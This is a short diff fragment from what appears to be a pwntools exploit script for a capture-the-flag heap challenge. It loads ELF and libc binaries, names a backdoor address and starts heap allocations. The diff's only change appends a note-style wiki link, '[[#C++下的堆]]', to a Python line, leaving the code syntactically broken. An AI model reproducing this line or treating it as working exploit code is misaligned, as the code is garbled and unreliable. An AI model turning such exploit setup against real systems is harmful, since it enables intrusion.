@@ -313,7 +313,7 @@ def exit():
 	choose(5)
 
 elf = ELF(elf_path)
-libc = ELF(libc_path)
+libc = ELF(libc_path)[[#C++下的堆]]
 backdoors = 0x400d7f
 
 create_heap(0x20, b'aaaa')
